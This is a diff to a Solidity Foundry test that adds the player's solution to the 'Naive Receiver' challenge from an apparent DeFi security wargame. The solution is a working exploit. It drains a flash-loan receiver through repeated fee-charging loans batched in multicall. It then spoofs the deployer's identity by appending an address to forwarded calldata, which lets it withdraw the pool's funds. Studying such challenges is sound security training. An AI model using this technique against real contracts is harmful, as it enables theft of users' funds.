@@ -77,7 +77,50 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes memory flashLoanCallData = abi.encodeWithSignature(
+        "flashLoan(address,address,uint256,bytes)",
+            address(receiver),
+            address(weth),
+            WETH_IN_RECEIVER,
+            bytes("")
+        );
+        bytes[] memory dataArray = new bytes[](10);
+        for (uint256 i = 0; i < 10; i++) {
+            dataArray[i] = flashLoanCallData;
+        }
+        pool.multicall(dataArray);  
+ 
+ 
+        bytes memory WithdrawCallData = abi.encodeWithSignature(
+            "withdraw(uint256,address)",
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            recovery
+        );  
+        bytes memory deployerBytes = abi.encodePacked(deployer);
+        WithdrawCallData = abi.encodePacked(WithdrawCallData, deployerBytes);
+
+        bytes[] memory dataArray2 = new bytes[](1);
+        dataArray2[0] = WithdrawCallData;
+
+        bytes memory MulticallWithdrawCallData = abi.encodeWithSignature(
+            "multicall(bytes[])",
+            dataArray2
+        );    
+  
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 30000000,
+            nonce: forwarder.nonces(player),
+            data: MulticallWithdrawCallData,
+            deadline: block.timestamp + 10 hours
+        });
+        bytes32 msgHash = forwarder.getDataHash(request);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, keccak256(abi.encodePacked("\x19\x01",  forwarder.domainSeparator(), msgHash)));
+        bytes memory signature = abi.encodePacked(r, s, v);
+        assertEq(signature.length, 65);        
+        forwarder.execute(request, signature);        
     }
 
     /**
